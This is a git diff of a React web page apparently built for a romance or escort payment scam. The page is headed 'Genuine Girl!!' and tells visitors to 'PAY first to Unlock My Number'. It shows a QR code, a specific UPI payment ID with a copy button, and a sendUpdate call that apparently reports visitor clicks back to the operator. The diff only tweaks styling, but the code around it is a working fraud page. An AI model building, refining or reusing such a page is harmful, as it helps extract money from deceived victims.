@@ -74,7 +74,7 @@ function App() {
   return (
     <div className="App" onClick={() => { /*setisOpen(false) */ }}>
       <header className="App-header">
-        <h1 style={{}}>🍆Genuine Girl!!🍆</h1>
+        <h1 style={{ margin: '-15px 0px' }}>🍆Genuine Girl!!🍆</h1>
         <CopyExample />
         <MsgBtnCombo msg="You should PAY first to Unlock My Number!!😜" btnName="PAY NOW!!" handler={handlepayButton} err={true}></MsgBtnCombo>
         <MsgBtnCombo msg="Click Below👇 For My Whatsapp Number!!" btnName="Whatsapp Number!" handler={handleWspButton} err={false}></MsgBtnCombo>
@@ -116,7 +116,7 @@ function CopyExample() {
         <p style={{ marginTop: "-20px" }}> Pay to my QR Code 👇🏻👇🏻👇🏻</p>
       </div>
       <img className='qr' style={{ marginTop: "-16px" }} alt='' src='./QR.jpg'></img>
-      <img style={{ marginBottom: "-10px", width: "140px"}} alt='' src='./upilogo.png'></img>
+      <img style={{ marginBottom: "-10px", width: "140px" }} alt='' src='./upilogo.png'></img>
       <div style={{ display: "flex", padding: "12px", height: "50px", margin: "-5px" }}>
         <input readOnly value={"bharatpe.0851610820@icici"}></input >
         <button className='cpybutton' onClick={async () => { setIsCopyOpen(true); await sendUpdate('Copied'); navigator.clipboard.writeText('bharatpe.0851610820@icici') }}>Copy</button>
